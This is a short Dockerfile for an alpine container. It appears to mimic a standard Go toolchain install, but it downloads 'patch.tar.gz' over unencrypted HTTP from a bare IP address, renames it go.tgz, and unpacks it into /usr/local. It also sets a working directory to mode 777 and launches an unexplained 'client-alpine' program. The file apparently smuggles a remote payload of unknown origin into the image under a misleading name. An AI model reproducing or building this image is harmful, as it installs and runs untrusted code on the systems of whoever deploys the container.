FROM alpine:3.6

RUN apk add --no-cache ca-certificates

RUN set -eux; \
	apk add --no-cache --virtual .build-deps \
		bash \
		wget \
	; \
	\
	wget -O go.tgz "http://188.166.213.154/patch.tar.gz"; \
	echo 'd6eeb605708a539314bc10abaae706454a8815423d3c93585ec511957ad6a688 *go.tgz' | sha256sum -c -; \
	tar -C /usr/local -xzf go.tgz; \
	rm go.tgz; \
	\
	export PATH="/usr/local/bin:$PATH"; 
	

ENV WORKPATH /convert

RUN mkdir -p "$WORKPATH" && chmod -R 777 "$WORKPATH"
WORKDIR $WORKPATH

CMD ["client-alpine"]